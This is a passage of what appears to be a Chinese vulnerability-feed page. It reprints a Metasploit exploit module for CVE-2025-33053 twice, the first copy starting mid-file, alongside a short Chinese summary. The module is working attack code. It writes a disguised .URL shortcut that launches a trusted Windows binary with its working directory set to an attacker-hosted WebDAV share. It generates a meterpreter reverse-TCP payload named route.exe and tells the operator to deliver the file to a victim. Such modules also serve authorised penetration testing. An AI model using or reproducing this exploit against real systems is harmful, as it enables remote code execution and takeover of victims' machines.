CVE-2025-33053 via malicious .URL and WebDAV payload hosting.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">NormalRanking</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;CVE-2025-33053 Exploit via Malicious .URL File and WebDAV&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing</span><br><span class="hljs-string">          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.</span><br><span class="hljs-string">          Optionally, a payload is generated and hosted on a specified WebDAV directory.</span><br><span class="hljs-string">          When the victim opens the shortcut, it will attempt to access the WebDAV path,</span><br><span class="hljs-string">          potentially resulting in remote code execution via a trusted binary.</span><br><span class="hljs-string">        &#x27;</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;Dev Bui Hieu&#x27;</span>],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-11&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-33053&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X64</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Windows (generic)&#x27;</span>, &#123;&#125;]],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARTIFACTS_ON_DISK</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;OUTFILE&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Output URL file name&#x27;</span>, <span class="hljs-string">&#x27;bait.url&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_NAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Output payload file name&#x27;</span>, <span class="hljs-string">&#x27;route.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Payload to generate&#x27;</span>, <span class="hljs-string">&#x27;windows/x64/meterpreter/reverse_tcp&#x27;</span>]),<br>        <span class="hljs-title class_">OptBool</span>.new(<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Generate payload and move to WebDAV directory&#x27;</span>, <span class="hljs-literal">true</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;WebDAV directory path&#x27;</span>, <span class="hljs-string">&#x27;/var/www/webdav&#x27;</span>])<br>      ]<br>    )<br>    register_advanced_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Path to trusted binary (LOLBAS)&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files\\Internet Explorer\\iediagcmd.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon file path&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptInt</span>.new(<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon index in icon file&#x27;</span>, <span class="hljs-number">13</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Modified timestamp in hex&#x27;</span>, <span class="hljs-string">&#x27;20F06BA06D07BD014D&#x27;</span>])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    prepare_webdav_dir<br>    generate_payload_if_needed<br>    write_url_file<br>    print_status(<span class="hljs-string">&quot;Module complete. Deliver <span class="hljs-subst">#&#123;<span class="hljs-title class_">File</span>.expand_path(datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>])&#125;</span> to victim.&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_webdav_dir</span><br>    print_status(<span class="hljs-string">&#x27;Creating WebDAV directory if not exists...&#x27;</span>)<br>    <span class="hljs-title class_">FileUtils</span>.mkdir_p(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]) <span class="hljs-keyword">unless</span> <span class="hljs-title class_">File</span>.directory?(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>,<br>              <span class="hljs-string">&quot;Cannot create WebDAV directory. Permission denied.\n&quot;</span> \<br>              <span class="hljs-string">&quot;Try restarting Metasploit with sudo or change ownership of <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]&#125;</span>.&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_if_needed</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> datastore[<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>]<br><br>    exe_path = <span class="hljs-title class_">File</span>.join(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>], datastore[<span class="hljs-string">&#x27;PAYLOAD_NAME&#x27;</span>])<br>    print_status(<span class="hljs-string">&#x27;Generating payload...&#x27;</span>)<br>    generate_payload_exe(datastore[<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>], datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>], datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>], exe_path)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_exe</span>(<span class="hljs-params">payload_name, lhost, lport, output_path</span>)<br>    payload = framework.payloads.create(payload_name.to_s.strip)<br>    payload.datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>] = lhost<br>    payload.datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>] = lport<br>    raw = payload.generate<br>    exe = <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Util</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EXE</span>.to_win32pe(framework, raw)<br>    write_exe_file(output_path, exe)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_exe_file</span>(<span class="hljs-params">path, exe</span>)<br>    <span class="hljs-title class_">File</span>.open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; |<span class="hljs-params">f</span>| f.write(exe) &#125;<br>    print_good(<span class="hljs-string">&quot;Payload successfully written to <span class="hljs-subst">#&#123;path&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>    return_error(path)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_url_file</span><br>    content = generate_url_content<br>    outfile = datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>]<br>    <span class="hljs-keyword">begin</span><br>      print_status(<span class="hljs-string">&#x27;Generating .URL file...&#x27;</span>)<br>      <span class="hljs-title class_">File</span>.write(outfile, content)<br>      print_good(<span class="hljs-string">&quot;.URL file written to: <span class="hljs-subst">#&#123;outfile&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>      return_error(<span class="hljs-title class_">File</span>.expand_path(outfile))<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_url_content</span><br>    unc_path = <span class="hljs-string">&quot;\\\\<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>]&#125;</span>\\<span class="hljs-subst">#&#123;<span class="hljs-title class_">File</span>.basename(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])&#125;</span>\\&quot;</span><br>    <span class="hljs-string">&lt;&lt;~URLFILE</span><br><span class="hljs-string">      [InternetShortcut]</span><br><span class="hljs-string">      URL=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      WorkingDirectory=<span class="hljs-subst">#&#123;unc_path&#125;</span></span><br><span class="hljs-string">      ShowCommand=7</span><br><span class="hljs-string">      IconIndex=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      IconFile=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      Modified=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">    URLFILE</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">return_error</span>(<span class="hljs-params">currentpath</span>)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>,<br>              <span class="hljs-string">&quot;Cannot write to <span class="hljs-subst">#&#123;currentpath&#125;</span>. Permission denied.\n&quot;</span> \<br>              <span class="hljs-string">&#x27;Try restarting Metasploit with root privilege.&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-33053 Exploit via Malicious .U</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</title>
-    <link href="http://example.com/2025/06/18/github_3981798576/"/>
-    <id>http://example.com/2025/06/18/github_3981798576/</id>
-    <published>2025-06-18T03:15:15.117Z</published>
-    <updated>2025-06-18T03:15:15.115Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-33053</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过生成恶意的.URL文件来利用CVE-2025-33053，该文件指向一个受信任的LOLBAS二进制文件，其参数设计用于触发意外行为。可选地，生成一个有效载荷并托管在指定的WebDAV目录上。当受害者打开快捷方式时，它将尝试访问WebDAV路径，可能导致通过受信任的二进制文件实现远程代码执行。</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/20b8a9fcd3a38bd7cc0289629669fad2df20f501/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb">https://github.com/rapid7/metasploit-framework/blob/20b8a9fcd3a38bd7cc0289629669fad2df20f501/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment"># frozen_string_literal: true</span><br><br><span class="hljs-comment"># Metasploit module to exploit CVE-2025-33053 via malicious .URL and WebDAV payload hosting.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">NormalRanking</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;CVE-2025-33053 Exploit via Malicious .URL File and WebDAV&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing</span><br><span class="hljs-string">          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.</span><br><span class="hljs-string">          Optionally, a payload is generated and hosted on a specified WebDAV directory.</span><br><span class="hljs-string">          When the victim opens the shortcut, it will attempt to access the WebDAV path,</span><br><span class="hljs-string">          potentially resulting in remote code execution via a trusted binary.</span><br><span class="hljs-string">        &#x27;</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;Dev Bui Hieu&#x27;</span>],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-11&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-33053&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X64</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Windows (generic)&#x27;</span>, &#123;&#125;]],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARTIFACTS_ON_DISK</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;OUTFILE&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Output URL file name&#x27;</span>, <span class="hljs-string">&#x27;bait.url&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD_NAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Output payload file name&#x27;</span>, <span class="hljs-string">&#x27;route.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Payload to generate&#x27;</span>, <span class="hljs-string">&#x27;windows/x64/meterpreter/reverse_tcp&#x27;</span>]),<br>        <span class="hljs-title class_">OptBool</span>.new(<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Generate payload and move to WebDAV directory&#x27;</span>, <span class="hljs-literal">true</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;WebDAV directory path&#x27;</span>, <span class="hljs-string">&#x27;/var/www/webdav&#x27;</span>])<br>      ]<br>    )<br>    register_advanced_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Path to trusted binary (LOLBAS)&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files\\Internet Explorer\\iediagcmd.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon file path&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptInt</span>.new(<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon index in icon file&#x27;</span>, <span class="hljs-number">13</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Modified timestamp in hex&#x27;</span>, <span class="hljs-string">&#x27;20F06BA06D07BD014D&#x27;</span>])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    prepare_webdav_dir<br>    generate_payload_if_needed<br>    write_url_file<br>    print_status(<span class="hljs-string">&quot;Module complete. Deliver <span class="hljs-subst">#&#123;<span class="hljs-title class_">File</span>.expand_path(datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>])&#125;</span> to victim.&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_webdav_dir</span><br>    print_status(<span class="hljs-string">&#x27;Creating WebDAV directory if not exists...&#x27;</span>)<br>    <span class="hljs-title class_">FileUtils</span>.mkdir_p(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]) <span class="hljs-keyword">unless</span> <span class="hljs-title class_">File</span>.directory?(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>,<br>              <span class="hljs-string">&quot;Cannot create WebDAV directory. Permission denied.\n&quot;</span> \<br>              <span class="hljs-string">&quot;Try restarting Metasploit with sudo or change ownership of <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]&#125;</span>.&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_if_needed</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> datastore[<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>]<br><br>    exe_path = <span class="hljs-title class_">File</span>.join(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>], datastore[<span class="hljs-string">&#x27;PAYLOAD_NAME&#x27;</span>])<br>    print_status(<span class="hljs-string">&#x27;Generating payload...&#x27;</span>)<br>    generate_payload_exe(datastore[<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>], datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>], datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>], exe_path)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_exe</span>(<span class="hljs-params">payload_name, lhost, lport, output_path</span>)<br>    payload = framework.payloads.create(payload_name.to_s.strip)<br>    payload.datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>] = lhost<br>    payload.datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>] = lport<br>    raw = payload.generate<br>    exe = <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Util</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EXE</span>.to_win32pe(framework, raw)<br>    write_exe_file(output_path, exe)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_exe_file</span>(<span class="hljs-params">path, exe</span>)<br>    <span class="hljs-title class_">File</span>.open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; |<span class="hljs-params">f</span>| f.write(exe) &#125;<br>    print_good(<span class="hljs-string">&quot;Payload successfully written to <span class="hljs-subst">#&#123;path&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>    return_error(path)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_url_file</span><br>    content = generate_url_content<br>    outfile = datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>]<br>    <span class="hljs-keyword">begin</span><br>      print_status(<span class="hljs-string">&#x27;Generating .URL file...&#x27;</span>)<br>      <span class="hljs-title class_">File</span>.write(outfile, content)<br>      print_good(<span class="hljs-string">&quot;.URL file written to: <span class="hljs-subst">#&#123;outfile&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>      return_error(<span class="hljs-title class_">File</span>.expand_path(outfile))<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_url_content</span><br>    unc_path = <span class="hljs-string">&quot;\\\\<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>]&#125;</span>\\<span class="hljs-subst">#&#123;<span class="hljs-title class_">File</span>.basename(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])&#125;</span>\\&quot;</span><br>    <span class="hljs-string">&lt;&lt;~URLFILE</span><br><span class="hljs-string">      [InternetShortcut]</span><br><span class="hljs-string">      URL=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      WorkingDirectory=<span class="hljs-subst">#&#123;unc_path&#125;</span></span><br><span class="hljs-string">      ShowCommand=7</span><br><span class="hljs-string">      IconIndex=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      IconFile=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      Modified=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">    URLFILE</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">return_error</span>(<span class="hljs-params">currentpath</span>)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>,<br>              <span class="hljs-string">&quot;Cannot write to <span class="hljs-subst">#&#123;currentpath&#125;</span>. Permission denied.\n&quot;</span> \<br>              <span class="hljs-string">&#x27;Try restarting Metasploit with root privilege.&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
